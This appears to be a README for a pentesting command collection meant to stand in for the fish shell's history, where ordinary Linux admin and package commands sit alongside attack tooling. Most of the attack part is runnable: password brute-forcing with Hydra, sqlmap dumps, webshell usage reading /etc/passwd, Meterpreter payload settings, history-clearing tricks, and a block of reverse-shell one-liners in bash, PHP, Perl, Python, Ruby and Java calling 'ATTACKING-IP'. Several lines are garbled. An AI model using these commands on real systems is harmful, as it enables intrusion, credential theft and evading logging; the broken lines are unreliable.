# fishfry
replaces fish history with a history tailored to pentesters for efficency and newbie pentesters for learning, new linux users, and several distro specific commands over 100 total commands with full discriptions.

replace the stock fishshell history located at '~/.config/fish/fish_history' with '~/.config/fish/fish_history_pentesting_suite'

full listing and description of the commands:


 nmap -v -sS -A -T4 target - Nmap verbose scan, runs syn stealth, T4 timing (should be ok on LAN), OS and service version info, traceroute and scripts against services'

 nmap -v -sS -p--A -T4 target - As above but scans all TCP ports (takes a lot longer)

 nmap -v -sU -sS -p- -A -T4 target - As above but scans all TCP ports and UDP scan (takes even longer)

 nmap -v -p 445 --script=smb-check-vulns--script-args=unsafe=1 192.168.1.X - Nmap script to scan for vulnerable SMB servers - WARNING: unsafe=1 may cause knockover

 ls /usr/share/nmap/scripts/* | grep ftp - Search nmap scripts for keywords

 nbtscan 192.168.1.0/24 - Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain

 enum4linux -a target-ip - Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing

 nbtscan -v - Displays the nbtscan version

 nbtscan -f target(s) - This shows the full NBT resource record responses for each machine scanned, not a one line summary, use this options when scanning a single host

 nbtscan -O file-name.txt target(s) - Sends output to a file

 nbtscan -H - Generate an HTTP header

 nbtscan -P - Generate Perl hashref output, which can be loaded into an existing program for easier processing, much easier than parsing text output

 nbtscan -V - Enable verbose mode

 nbtscan -n - Turns off this inverse name lookup, for hanging resolution

 nbtscan -p PORT target(s) - This allows specification of a UDP port number to be used as the source in sending a query

 nbtscan -m - Include the MAC (aka "Ethernet") addresses in the response, which is already implied by the -f option.

 netdiscover -r 192.168.1.0/24 - Discovers IP, MAC Address and MAC vendor on the subnet from ARP, helpful for confirming you're on the right VLAN at $client site

 nbtscan 192.168.1.0/24 - Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain

 enum4linux -a target-ip - Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing

 python -m SimpleHTTPServer 80 - Run a basic http server, great for serving up shells etc

 mount 192.168.1.1:/vol/share /mnt/nfs - Mount NFS share to /mnt/nfs

 mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs - Mount Windows CIFS / SMB share on Linux at /mnt/cifs if you remove password it will prompt on the CLI (more secure as it wont end up in bash_history)

 net use Z: \\win-server\share password /user:domain\janedoe /savecred /p:no - Mount a Windows share on Windows from the command line

 apt-get install smb4k -y - Install smb4k on Kali, useful Linux GUI for browsing SMB shares

 nc -v 192.168.1.1 25 - telnet 192.168.1.1 25 - Basic versioning / finger printing via displayed banner

 nmpcheck -t 192.168.1.X -c public

 snmpwalk -c public -v1 192.168.1.X 1 | grep hrSWRunName | cut -d* * -f 

 snmpenum -t 192.168.1.X

 onesixtyone -c names -i hosts

 nslookup -> set type=any -> ls -d blah.com - Windows DNS zone transfer

 dig axfr blah.com @ns1.blah.com - Linux DNS zone transfer

 dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml

 nikto -h 192.168.1.1 - Perform a nikto scan against target

 dirbuster - Configure via GUI, CLI input doesn't work most of the time

 tcpdump tcp port 80 -w output.pcap -i eth0 - tcpdump for port 80 on interface eth0, outputs to output.pcap

 python /usr/share/doc/python-impacket-doc/examples

 /samrdump.py 192.168.XXX.XXX - Enumerate users from SMB

 ridenum.py 192.168.XXX.XXX 500 50000 dict.txt - RID cycle SMB / enumerate users from SMB

 snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25 | cut -d” “ -f4 - Enmerate users from SNMP

 python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX - Enmerate users from SNMP

 nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt (then grep) - Search for SNMP servers with nmap, grepable output

 /usr/share/wordlists - Kali word lists

 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V - Hydra FTP brute force

 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V - Hydra POP3 brute force

 hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V - Hydra SMTP brute force

 John The Ripper - JTR

 john --wordlist=/usr/share/wordlists/rockyou.txt hashes - JTR password cracking

 john --format=descrypt --wordlist 

 /usr/share/wordlists/rockyou.txt hash.txt - JTR forced descrypt cracking with wordlist

 john --format=descrypt hash --show - JTR forced descrypt brute force cracking

 searchsploit windows 2003 | grep -i local - Search exploit-db for exploit, in this example windows 2003 + local esc

 site:exploit-db.com exploit kernel <= 3 - Use google to search exploit-db.com for exploits

 grep -R "W7" /usr/share/metasploit-framework

 /modules/exploit/windows/* - Search metasploit modules using grep - msf search sucks a bit

 netstat -tulpn - Show Linux network ports with process ID's (PIDs)

 watch ss -stplu - Watch TCP, UDP open ports in real time with socket summary.

 lsof -i - Show established connections.

 macchanger -m MACADDR INTR - Change MAC address on KALI Linux.

 ifconfig eth0 192.168.2.1/24 - Set IP address in Linux.

 ifconfig eth0:1 192.168.2.3/24 - Add IP address to existing network interface in Linux.

 ifconfig eth0 hw ether MACADDR - Change MAC address in Linux using ifconfig.

 ifconfig eth0 mtu 1500 - Change MTU size Linux using ifconfig, change 1500 to your desired MTU.

 dig -x 192.168.1.1 - Dig reverse lookup on an IP address.

 host 192.168.1.1 - Reverse lookup on an IP address, in case dig is not installed.

 dig @192.168.2.2 domain.com -t AXFR - Perform a DNS zone transfer using dig.

 host -l domain.com nameserver - Perform a DNS zone transfer using host.

 nbtstat -A x.x.x.x - Get hostname for IP address.

 ip addr add 192.168.2.22/24 dev eth0 - Adds a hidden IP address to Linux, does not show up when performing an ifconfig.

 tcpkill -9 host google.com - Blocks access to google.com from the host machine.

 echo "1" > /proc/sys/net/ipv4/ip_forward - Enables IP forwarding, turns Linux box into a router - handy for routing traffic through a box.

 echo "8.8.8.8" > /etc/resolv.conf - Use Google DNS.

 whoami - Shows currently logged in user on Linux.

 id - Shows currently logged in user and groups for the user.

 last - Shows last logged in users.

 mount - Show mounted drives.

 df -h - Shows disk usage in human readable output.

 echo "user:passwd" | chpasswd - Reset password in one line.

 getent passwd - List users on Linux.

 strings /usr/local/bin/blah - Shows contents of none text files, e.g. whats in a binary.

 uname -ar - Shows running kernel version.

 PATH=$PATH:/my/new-path - Add a new PATH, handy for local FS manipulation.

 history - Show bash history, commands the user has entered previously.

 cat /etc/redhat-release - Shows Redhat / CentOS version number.

 rpm -qa - List all installed RPM's on an RPM based Linux distro.

 rpm -q --changelog openvpn - Check installed RPM is patched against CVE, grep the output for CVE.

 yum update - Update all RPM packages with YUM, also shows whats out of date.

 yum update httpd - Update individual packages, in this example HTTPD (Apache).

 yum install package - Install a package using YUM.

 yum --exclude=package kernel* update - Exclude a package from being updates with YUM.

 yum remove package - Remove package with YUM.

 yum erase package - Remove package with YUM.

 yum list package - Lists info about yum package.

 yum provides httpd - What a packages does, e.g Apache HTTPD Server.

 yum info httpd - Shows package info, architecture, version etc.

 yum localinstall blah.rpm - Use YUM to install local RPM, settles deps from repo.

 yum deplist package - Shows deps for a package.

 yum list installed | more - List all installed packages.

 yum grouplist | more - Show all YUM groups.

 yum groupinstall 'Development Tools' - Install YUM group.

 cat /etc/debian_version - Shows Debian version number.

 cat /etc/*-release - Shows Ubuntu version number.

 dpkg -l - List all installed packages on Debian / .deb based Linux distro.
Linux User Management

 useradd new-user - Creates a new Linux user.

 passwd username - Reset Linux user password, enter just passwd if you are root.

 deluser username - Remove a Linux user.

 unzip archive.zip - Extracts zip file on Linux.

 zipgrep *.txt archive.zip - Search inside a .zip archive.

 tar xf archive.tar - Extract tar file Linux.

 tar xvzf archive.tar.gz - Extract a tar.gz file Linux.

 tar xjf archive.tar.bz2 - Extract a tar.bz2 file Linux.

 tar ztvf file.tar.gz | grep blah - Search inside a tar.gz file.

 gzip -d archive.gz - Extract a gzip file Linux.

 zcat archive.gz - Read a gz file Linux without decompressing.

 zless archive.gz - Same function as the less command for .gz archives.

 zgrep 'blah' /var/log/maillog*.gz - Search inside .gz archives on Linux, search inside of compressed log files.

 vim file.txt.gz - Use vim to read .txt.gz files (my personal favorite).

 upx -9 -o output.exe input.exe - UPX compress .exe file Linux.

 zip -r file.zip /dir/* - Creates a .zip file on Linux.

 tar cf archive.tar files - Creates a tar file on Linux.

 tar czf archive.tar.gz files - Creates a tar.gz file on Linux.

 tar cjf archive.tar.bz2 files - Creates a tar.bz2 file on Linux.

 gzip file - Creates a file.gz file on Linux.

 df -h blah - Display size of file / dir Linux.

 diff file1 file2 - Compare / Show differences between two files on Linux.

 md5sum file - Generate MD5SUM Linux.

 md5sum -c blah.iso.md5 - Check file against MD5SUM on Linux, assuming both file and .md5 are in the same dir.

 file blah - Find out the type of file on Linux, also displays if file is 32 or 64 bit.

 dos2unix - Convert Windows line endings to Unix / Linux.

 base64 < input-file > output-file - Base64 encodes input file and outputs a Base64 encoded file called output-file.

 base64 -d < input-file > output-file - Base64 decodes input file and outputs a Base64 decoded file called output-file.

 touch -r ref-file new-file - Creates a new file using the timestamp data from the reference file, drop the -r to simply create a file.

 rm -rf - Remove files and directories without prompting for confirmation.

 $ smbmount //server/share /mnt/win -o user=username,password=password1 , smbclient -U user \\\\server\\share , $ mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share

 init 6 - Reboot Linux from the command line.

 gcc -o output.c input.c - Compile C code.

 gcc -m32 -o output.c input.c - Cross compile C code, compile 32 bit binary on 64 bit Linux.

 unset HISTORYFILE - Disable bash history logging.

 rdesktop X.X.X.X - Connect to RDP server from Linux.

 kill -9 $$ - Kill current session.

 chown user:group blah - Change owner of file or dir.

 chown -R user:group blah - Change owner of file or dir and all underlying files / dirs - recersive chown.

 chmod 600 file - Change file / dir permissions, see [Linux File System Permissons](#linux-file-system-permissions) for details.

 Clear bash history - $ ssh user@X.X.X.X | cat /dev/null > ~/.bash_history

 777 rwxrwxrwx No restriction, global WRX any user can do anything.

 755 rwxr-xr-x Owner has full access, others can read and execute the file.

 700 rwx------ Owner has full access, no one else has access.

 666 rw-rw-rw- All users can read and write but not execute.

 644 rw-r--r-- Owner can read and write, everyone else can read.

 600 rw------- Owner can read and write, everyone else has no access.

 / - also know as "slash" or the root.

 /bin - Common programs, shared by the system, the system administrator and the users.

 /boot - Boot files, boot loader (grub), kernels, vmlinuz

 /dev - Contains references to system devices, files with special properties.

 /etc - Important system config files.

 /home - Home directories for system users.

 /lib - Library files, includes files for all kinds of programs needed by the system and the users.

 /lost+found - Files that were saved during failures are here.

 /mnt - Standard mount point for external file systems.

 /media - Mount point for external file systems (on some distros).

 /net - Standard mount point for entire remote file systems - nfs.

 /opt - Typically contains extra and third party software.

 /proc - A virtual file system containing information about system resources.

 /root - root users home dir.

 /sbin - Programs for use by the system and the system administrator.

 /tmp - Temporary space for use by the system, cleaned upon reboot.

 /usr -Programs, libraries, documentation etc. for all user-related programs.

 /var - Storage for all variable files and temporary files created by users, such as log files, mail queue, print spooler. Web servers, Databases etc.

 /etc/passwd - Contains local Linux users.

 /etc/shadow - Contains local account password hashes. 

 /etc/group - Contains local account groups.

 /etc/init.d/ - Contains service init script - worth a look to see whats installed. 

 /etc/hostname - System hostname. 

 /etc/network/interfaces - Network interfaces. 

 /etc/resolv.conf - System DNS servers. 

 /etc/profile - System environment variables. 

 ~/.ssh/ - SSH keys.

 ~/.bash_history - Users bash history log.

 /var/log/ - Linux system log files are typically stored here. 

 /var/adm/ - UNIX system log files are typically stored here.

 /var/log/apache2/access.log & /var/log/httpd/access.log - Apache access log file typical path.

 /etc/fstab - File system mounts. 

 gcc -o exploit exploit.c - Basic GCC compile

 gcc -m32 exploit.c -o exploit - Cross compile 32 bit binary on 64 bit Linux

 i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe - Compile windows .exe on Linux

 gcc -o suid suid.c

 gcc -m32 -o suid suid.c - for 32bit

 root@kali:~# nc -nvlp 80 , nc: listening on :: 80 ... , nc: listening on 0.0.0.0 80 ...

 exec /bin/bash 0&0 2>&0 , 0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196 , exec 5<>/dev/tcp/ATTACKING-IP/80 , cat <&5 | while read line; do $line 2>&5 >&5; done , # or: , while read line 0<&5; do $line 2>&5 >&5; done , bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1

 php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");' , (Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)

 nc -e /bin/sh ATTACKING-IP 80 , /bin/sh | nc ATTACKING-IP 80 , rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p

 rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p , telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443

 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' , #perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

 ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

 r = Runtime.getRuntime() , p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) , p.waitFor()

 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

 /usr/share/webshells/php/php-reverse-shell.php - Pen Test Monkey - PHP Reverse Shell

 /usr/share/webshells/php/php-findsock-shell.php

 /usr/share/webshells/php/findsock.c - Pen Test Monkey, Findsock Shell. Build gcc -o findsock findsock.c (be mindfull of the target servers architecture), execute with netcat not a browser nc -v target 80

 /usr/share/webshells/php/simple-backdoor.php - PHP backdoor, usefull for CMD execution if upload / code injection is possible, usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

 /usr/share/webshells/php/php-backdoor.php - Larger PHP shell, with a text input box for command execution.

 /usr/share/webshells/perl/perl-reverse-shell.pl - Pen Test Monkey - Perl Reverse Shell

 /usr/share/webshells/perl/perlcmd.cgi - Pen Test Monkey, Perl Shell. Usage: http://target.com/perlcmd.cgi?cat /etc/passwd

 /usr/share/webshells/cfm/cfexec.cfm - Cold Fusion Shell - aka CFM Shell

 /usr/share/webshells/asp/ - Kali ASP Shells

 /usr/share/webshells/aspx/ - Kali ASPX Shells

 /usr/share/webshells/jsp/jsp-reverse.jsp - Kali JSP Reverse Shell

 Python TTY Shell Trick - python -c 'import pty;pty.spawn("/bin/bash")' - echo os.system('/bin/bash')

 Spawn Interactive sh shell - /bin/sh -i

 Spawn Perl TTY Shell - exec "/bin/sh"; perl —e 'exec "/bin/sh";'

 Spawn Ruby TTY Shell - exec "/bin/sh"

 Spawn Lua TTY Shell - os.execute('/bin/sh')

 Run shell commands from vi: - :!bash

 Spawn TTY Shell NMAP - !sh

 ssh -L 9999:10.0.2.2:445 user@192.168.2.250 - Port 9999 locally is forwarded to port 445 on 10.0.2.2 through host 192.168.2.250

 ssh -D 127.0.0.1:9050 root@192.168.2.250 - Dynamically allows all port forwards to the subnets availble on the target.

 set payload windows/meterpreter/reverse_tcp - Windows reverse tcp payload

 set payload windows/vncinject/reverse_tcp

 set ViewOnly false - Meterpreter Windows VNC Payload

 set payload linux/meterpreter/reverse_tcp - Meterpreter Linux Reverse Payload

 MD5 Hash Length - 16 Bytes

 SHA-1 Hash Length - 20 Bytes

 SHA-256 Hash Length - 32 Bytes

 SHA-512 Hash Length - 64 Bytes

 sqlmap -u http://meh.com --forms --batch --crawl=10--cookie=jsessionid=54321 --level=5 --risk=3 - Automated sqlmap scan

 sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php" - Targeted sqlmap scan

 sqlmap -u "http://meh.com/meh.php?id=1"--dbms=mysql --tech=U --random-agent --dump - Scan url for union + error based injection with mysql backend and use a random user agent + database dump

 sqlmap -o -u "http://meh.com/form/" --forms - sqlmap check form for injection

 sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump - sqlmap dump and crack hashes for table users on database-name

















